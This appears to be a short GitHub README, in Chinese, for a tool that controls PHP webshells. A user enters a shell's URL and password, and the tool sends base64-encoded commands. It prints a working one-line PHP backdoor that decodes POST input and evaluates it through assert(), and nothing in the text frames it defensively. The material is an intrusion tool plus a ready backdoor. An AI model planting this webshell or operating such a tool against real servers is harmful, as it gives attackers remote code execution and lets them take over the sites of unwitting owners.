# php_webshell_use
只需要把webshell地址,密码输入进去就可以进行操作  
webshell内容必须要是base64加密的内容  
示例代码如下:  
"\<?php assert(base64_decode($_POST['z'])); ?>"  
只要你的密码接收值是base64编码后的结果可使用此脚本
![b02df61511329d0a65b6d8b067f7536](https://github.com/Canhokseng/php_webshell_use/assets/95032598/414d0f2d-66fb-44b9-ac6c-6b47934c00a3)





